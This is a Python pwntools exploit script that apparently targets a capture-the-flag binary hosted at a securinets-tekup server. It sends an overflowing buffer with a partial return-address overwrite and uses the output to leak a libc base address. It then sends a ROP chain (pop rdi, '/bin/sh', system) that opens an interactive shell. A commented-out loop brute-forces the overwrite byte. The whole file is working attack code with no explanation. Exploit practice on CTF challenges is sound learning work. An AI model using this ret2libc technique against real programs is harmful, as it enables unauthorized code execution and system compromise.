from pwn import *
from time import sleep
context.arch = 'amd64'
def debug():
	if local<2:
		gdb.attach(p,'''
			b* main+93
			c
			''')
###############   files setup   ###############
local=len(sys.argv)
exe=ELF("./main_patched")
libc=ELF("./libc.so.6")
nc="nc pwned.securinets-tekup.tech 6666"
port=int(nc.split(" ")[2])
host=nc.split(" ")[1]

############### remote or local ###############
if local>1:
	p=remote(host,port)
else:
	p=process([exe.path])

############### helper functions ##############
def send():
	pass

############### main exploit    ###############
i=30
p.send(b"a"*0x28+i.to_bytes(1,'big'))

p.recvuntil(b"a"*0x28)
libc.address=u64(p.recv(6)+b"\x00"*2)-0x23a1e
print(hex(libc.address))
rop=ROP(libc)
rdi=rop.find_gadget(['pop rdi', 'ret'])[0]
ret =rdi+1
debug()

p.send(b"a"*0x28+p64(ret)+p64(rdi)+p64(next(libc.search(b"/bin/sh\x00")))+p64(libc.symbols["system"]))


'''
for i in range(10,0xff): #30
	p=process([exe.path])
	cond=1
	try:
		p.send(b"a"*0x28+i.to_bytes(1,'big'))
		sleep(0.01)
		#p.send(b"aaa")

	except:
		cond=0
	if cond:
		p.interactive()
		print(i)
'''

p.interactive()